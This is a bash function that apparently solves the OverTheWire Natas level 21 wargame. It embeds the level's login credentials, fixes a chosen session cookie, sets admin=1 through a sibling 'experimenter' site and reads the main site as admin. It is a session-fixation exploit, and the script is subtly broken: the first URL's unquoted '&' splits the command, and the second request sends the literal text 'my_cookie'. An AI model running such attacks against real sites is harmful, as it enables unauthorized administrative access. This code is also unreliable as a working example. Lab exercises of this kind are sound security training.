natas21_(){
	user_pass="natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ"
	url_experimenter="http://natas21-experimenter.natas.labs.overthewire.org/"
	url_main="http://natas21.natas.labs.overthewire.org/"
	my_cookie="PHPSESSID=hackerhack"

	_=$(curl -isu $user_pass $url_experimenter?submit&admin=1 --cookie "$my_cookie")
	val=$(curl -isu $user_pass $url_main --cookie "my_cookie")

	echo "$val"
}


